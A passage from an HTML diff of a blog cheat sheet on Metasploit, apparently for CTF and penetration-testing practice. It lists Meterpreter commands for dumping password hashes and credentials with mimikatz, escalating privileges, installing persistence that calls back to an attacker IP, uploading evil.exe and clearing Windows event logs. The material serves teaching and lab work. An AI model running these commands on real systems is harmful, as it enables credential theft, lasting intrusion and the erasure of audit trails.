+</span></span><span class="line"><span class="cl">sessions -i <span class="m">1</span>
+</span></span><span class="line"><span class="cl">sysinfo
+</span></span><span class="line"><span class="cl">getuid
+</span></span></code></pre></div><h3 id="post-exploitation-windows">Post-Exploitation (Windows)<a hidden class="anchor" aria-hidden="true" href="#post-exploitation-windows">#</a></h3>
+<h4 id="dump-hashes">Dump Hashes<a hidden class="anchor" aria-hidden="true" href="#dump-hashes">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashdump
+</span></span><span class="line"><span class="cl">load kiwi
+</span></span><span class="line"><span class="cl">kiwi_cmd <span class="s2">&#34;lsadump::sam&#34;</span>
+</span></span></code></pre></div><h4 id="process-migration">Process Migration<a hidden class="anchor" aria-hidden="true" href="#process-migration">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps
+</span></span><span class="line"><span class="cl">migrate &lt;pid&gt;
+</span></span><span class="line"><span class="cl">getpid
+</span></span></code></pre></div><h4 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getsystem
+</span></span></code></pre></div><p>Or use:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/local/bypassuac
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> SESSION <span class="m">1</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><h4 id="suggested-priv-esc-modules">Suggested Priv Esc Modules<a hidden class="anchor" aria-hidden="true" href="#suggested-priv-esc-modules">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run post/windows/escalate/ms10_015_kitrap0d
+</span></span></code></pre></div><h4 id="credential-dumping">Credential Dumping<a hidden class="anchor" aria-hidden="true" href="#credential-dumping">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kiwi_cmd <span class="s2">&#34;creds_wdigest&#34;</span>
+</span></span><span class="line"><span class="cl">kiwi_cmd <span class="s2">&#34;kerberos::list&#34;</span>
+</span></span></code></pre></div><h4 id="persistence">Persistence<a hidden class="anchor" aria-hidden="true" href="#persistence">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run persistence -U -i <span class="m">5</span> -p <span class="m">4444</span> -r &lt;your_ip&gt;
+</span></span></code></pre></div><h4 id="clear-logs">Clear Logs<a hidden class="anchor" aria-hidden="true" href="#clear-logs">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">clearev
+</span></span></code></pre></div><hr>
+<h1 id="-6-metasploit-file-management">📁 6. Metasploit File Management<a hidden class="anchor" aria-hidden="true" href="#-6-metasploit-file-management">#</a></h1>
+<h3 id="upload--download-files">Upload / Download Files<a hidden class="anchor" aria-hidden="true" href="#upload--download-files">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">upload evil.exe
+</span></span><span class="line"><span class="cl">download C:<span class="se">\\</span>Users<span class="se">\\</span>Admin<span class="se">\\</span>Desktop<span class="se">\\</span>flag.txt
+</span></span></code></pre></div><hr>
+<h1 id="-7-cheatsheet-commands">🔮 7. Cheatsheet Commands<a hidden class="anchor" aria-hidden="true" href="#-7-cheatsheet-commands">#</a></h1>
+<table>
+  <thead>
+      <tr>
+          <th>Task</th>
+          <th>Command</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Start console</td>
+          <td><code>msfconsole</code></td>
+      </tr>
+      <tr>
+          <td>Scan w/ nmap</td>
+          <td><code>db_nmap -sC -sV &lt;ip&gt;</code></td>
+      </tr>
+      <tr>
+          <td>List hosts/services</td>
+          <td><code>hosts</code>, <code>services</code></td>
+      </tr>
+      <tr>
+          <td>Search module</td>
+          <td><code>search &lt;name&gt;</code></td>
+      </tr>
+      <tr>
+          <td>Use module</td>
+          <td><code>use &lt;exploit&gt;</code></td>
+      </tr>
+      <tr>
+          <td>Show options</td>
+          <td><code>show options</code>, <code>show advanced</code></td>
+      </tr>
+      <tr>
+          <td>Show payloads</td>
+          <td><code>show payloads</code></td>
+      </tr>
+      <tr>
+          <td>Run exploit</td>
+          <td><code>run</code> or <code>exploit</code></td>
+      </tr>
+      <tr>
+          <td>Manage sessions</td>
+          <td><code>sessions -i &lt;id&gt;</code></td>
+      </tr>
+      <tr>
+          <td>Hashdump</td>
+          <td><code>hashdump</code></td>
+      </tr>
+      <tr>
+          <td>Post modules</td>
+          <td><code>run post/...</code></td>
+      </tr>
+      <tr>
+          <td>Load Kiwi (mimikatz)</td>
+          <td><code>load kiwi</code></td>
+      </tr>
+      <tr>
+          <td>File actions</td>
+          <td><code>upload</code>, <code>download</code></td>
+      </tr>
+      <tr>
+          <td>Clean logs (Windows)</td>
+          <td><code>clearev</code></td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h1 id="-tools--resources">🚀 Tools + Resources<a hidden class="anchor" aria-hidden="true" href="#-tools--resources">#</a></h1>
+<ul>
+<li><code>searchsploit</code>: offline exploit search</li>
+<li><code>john</code>: password cracking</li>
+<li><code>nmap</code>: port scanning</li>
+<li><code>linpeas.sh</code>, <code>winpeas.exe</code>: manual privilege escalation</li>
+<li><code>LOLBAS</code>: Windows native bin abuse</li>
+<li><code>GTFOBins</code>: Linux privilege escalation</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/metasploit/">Metasploit</a></li>
+      <li><a href="http://localhost:1313/tags/security-testing/">Security-Testing</a></li>
+      <li><a href="http://localhost:1313/tags/post-exploitation/">Post-Exploitation</a></li>
+      <li><a href="http://localhost:1313/tags/reverse-shell/">Reverse-Shell</a></li>
+      <li><a href="http://localhost:1313/tags/payload-generation/">Payload-Generation</a></li>
+      <li><a href="http://localhost:1313/tags/nmap/">Nmap</a></li>
+      <li><a href="http://localhost:1313/tags/hashdump/">Hashdump</a></li>
+      <li><a href="http://localhost:1313/tags/penetration-testing/">Penetration-Testing</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/metasploit-framework/">Metasploit-Framework</a></li>
+      <li><a href="http://localhost:1313/tags/security/">Security</a></li>
+      <li><a href="http://localhost:1313/tags/web-security/">Web-Security</a></li>
+      <li><a href="http://localhost:1313/tags/sql-injection/">Sql-Injection</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red-Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/ethical-hacking-community/">Ethical-Hacking-Community</a></li>
+      <li><a href="http://localhost:1313/tags/python-scripting/">Python-Scripting</a></li>
+      <li><a href="http://localhost:1313/tags/powershell-reverse-shell/">Powershell-Reverse-Shell</a></li>
+      <li><a href="http://localhost:1313/tags/reverse-shell-techniques/">Reverse-Shell-Techniques</a></li>
+      <li><a href="http://localhost:1313/tags/shell-encoding/">Shell-Encoding</a></li>
+      <li><a href="http://localhost:1313/tags/socat/">Socat</a></li>
+      <li><a href="http://localhost:1313/tags/runascs/">Runascs</a></li>
+      <li><a href="http://localhost:1313/tags/code-snippets/">Code-Snippets</a></li>
+      <li><a href="http://localhost:1313/tags/cross-platform/">Cross-Platform</a></li>
+      <li><a href="http://localhost:1313/tags/shell-scripting/">Shell-Scripting</a></li>
+      <li><a href="http://localhost:1313/tags/jsp/">Jsp</a></li>
+      <li><a href="http://localhost:1313/tags/war-file/">War-File</a></li>
+      <li><a href="http://localhost:1313/tags/msfvenom/">Msfvenom</a></li>
+      <li><a href="http://localhost:1313/tags/nodejs-exploitation/">Nodejs-Exploitation</a></li>
+      <li><a href="http://localhost:1313/tags/file-inclusion/">File-Inclusion</a></li>
+      <li><a href="http://localhost:1313/tags/pathtraversal/">PathTraversal</a></li>
+      <li><a href="http://localhost:1313/tags/php-filters/">Php-Filters</a></li>
+      <li><a href="http://localhost:1313/tags/htaccess-exploitation/">Htaccess-Exploitation</a></li>
+      <li><a href="http://localhost:1313/tags/rfi/">RFI</a></li>
+      <li><a href="http://localhost:1313/tags/php-filter/">Php-Filter</a></li>
+      <li><a href="http://localhost:1313/tags/local-file-inclusion/">Local-File-Inclusion</a></li>
+      <li><a href="http://localhost:1313/tags/url_encoding/">URL_Encoding</a></li>
+      <li><a href="http://localhost:1313/tags/path-traversal/">Path-Traversal</a></li>
+      <li><a href="http://localhost:1313/tags/log-poisoning/">Log-Poisoning</a></li>
+      <li><a href="http://localhost:1313/tags/http/">HTTP</a></li>
+      <li><a href="http://localhost:1313/tags/statuscode/">StatusCode</a></li>
+      <li><a href="http://localhost:1313/tags/bug-bounty/">Bug-Bounty</a></li>
+      <li><a href="http://localhost:1313/tags/web-fuzzing/">Web-Fuzzing</a></li>
+      <li><a href="http://localhost:1313/tags/directory-bruteforce/">Directory-Bruteforce</a></li>
+      <li><a href="http://localhost:1313/tags/http-status-codes/">Http-Status-Codes</a></li>
+      <li><a href="http://localhost:1313/tags/ffuf/">Ffuf</a></li>
+      <li><a href="http://localhost:1313/tags/fuzzing/">Fuzzing</a></li>
+      <li><a href="http://localhost:1313/tags/parameter-fuzzing/">Parameter-Fuzzing</a></li>
+      <li><a href="http://localhost:1313/tags/api-testing/">Api-Testing</a></li>
+      <li><a href="http://localhost:1313/tags/vhost-enum/">Vhost-Enum</a></li>
+      <li><a href="http://localhost:1313/tags/http-methods/">Http-Methods</a></li>
+      <li><a href="http://localhost:1313/tags/proxy/">Proxy</a></li>
+      <li><a href="http://localhost:1313/tags/rate-limiting/">Rate-Limiting</a></li>
+      <li><a href="http://localhost:1313/tags/content-discovery/">Content-Discovery</a></li>
+      <li><a href="http://localhost:1313/tags/ctf-tools/">Ctf-Tools</a></li>
+      <li><a href="http://localhost:1313/tags/ffuf-tool/">Ffuf-Tool</a></li>
+      <li><a href="http://localhost:1313/tags/metasploit-tutorial/">Metasploit-Tutorial</a></li>
+      <li><a href="http://localhost:1313/tags/ctf-guide/">Ctf-Guide</a></li>
+    </ul>
+<nav class="paginav">
+    <a class="prev" href="/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/">
+        <span class="title">« Prev</span>
+        <br>
+        <span>🛠️ Chisel Port Forwarding Guide</span>
+    </a>
+    <a class="next" href="/posts/tipsandtricks/cheatsheets/network-hacking/cracking-wifi-password-documentary/">
+        <span class="title">Next »</span>
+        <br>
+        <span>Cracking Wi-Fi Password Documentary</span>
+    </a>
+</nav>
+  </footer>
+</article>
+          <div style="margin-top: auto">
+            <div class="content-footer">
+              <div>© 2025 <a href="https://x.com/NoobGajen">Gajendra Mahato</a>. Some rights reserved.</div>
+              <div>Using the <a href="https://github.com/adityatelange/hugo-PaperMod">PaperMod</a> theme for <a
+                  href="https://gohugo.io/">Hugo</a>.</div>
+            </div>
+          </div>
+
+        </div>
+        <div class="right-sidebar">
+    <section>
+        <h2>Recently Added</h2>
+
+        
+        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-0-level-1/">Bandit: Level 0 =&gt; Level 1</a></div>
+        
+        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-1-level-2/">Bandit: Level 1 =&gt; Level 2</a></div>
+        
+        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-2-level-3/">Bandit: Level 2 =&gt; Level 3</a></div>
+        
+        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-3-level-4/">Bandit: Level 3 =&gt; Level 4</a></div>
+        
+        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-4-level-5/">Bandit: Level 4 =&gt; Level 5</a></div>
+        
+    </section>
+
+    <section>
+        <h2>Trending Tags</h2>
+                                                                                                                                                                                    
+        <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
+                                                                                                                                                                   
+    </section>
+
+    <section id="post-content">
+        <h2>Table of Content</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initialize-the-metasploit-database-first-time-only">Initialize the Metasploit Database (First Time Only)</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#quick-target-discovery">Quick Target Discovery</a></li>
+        <li><a href="#full-port--version-scan-integrated-with-metasploit-db">Full Port + Version Scan (Integrated with Metasploit DB)</a></li>
+        <li><a href="#view-discovered-hosts--services">View Discovered Hosts &amp; Services</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#search-by-service-name-or-cve">Search by service name or CVE</a></li>
+        <li><a href="#load-a-module">Load a Module</a></li>
+        <li><a href="#explore-module-info">Explore Module Info</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#example-ftp-backdoor">Example: FTP Backdoor</a>
+      <ul>
+        <li><a href="#if-shell-is-basic-upgrade">If Shell is Basic: Upgrade</a></li>
+        <li><a href="#or-use-web-delivery">Or Use Web Delivery</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-exploitation-linux">Post-Exploitation (Linux)</a>
+      <ul>
+        <li><a href="#enumerate-os-and-configs">Enumerate OS and Configs</a></li>
+        <li><a href="#dump-password-hashes">Dump Password Hashes</a></li>
+        <li><a href="#local-exploit-suggestion">Local Exploit Suggestion</a></li>
+        <li><a href="#example-local-root-exploit">Example Local Root Exploit</a></li>
+        <li><a href="#confirm-root">Confirm Root</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#example-eternalblue">Example: EternalBlue</a>
+      <ul>
+        <li><a href="#session-handling">Session Handling</a></li>
+        <li><a href="#post-exploitation-windows">Post-Exploitation (Windows)</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#upload--download-files">Upload / Download Files</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </section>
+</div>
+
+
+
+        <div class="search-results-wrapper">
+          <div class="search-results-list">
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  
+  <button id="scrollToTop" class="scroll-to-top">
+    <i class="fa-solid fa-arrow-up"></i>
+  </button>
+  
+
+  <div class="mobile-search-layout">
+    <header>
+      <div class="search-container"><span class="absolute left-3 top-2.5 text-gray-400">
+          <i class="fas fa-search"></i>
+        </span>
+        <input id="mobile-search-input" type="text" placeholder="Search..."
+          class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+      </div><button class="cancel-btn">Cancel</button>
+    </header>
+    <div class="search-results-list mobile-search-results-list"></div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
+  
+  <script src="/js/main.min.6cd0146acf9838eb3d5ac7ebaad0cd534927930fd1c398e8847e358ea1dedbff.js" integrity="sha256-bNAUas&#43;YOOs9WsfrqtDNU0knkw/Rw5johH41jqHe2/8="></script>
+</body>
+
+</html>
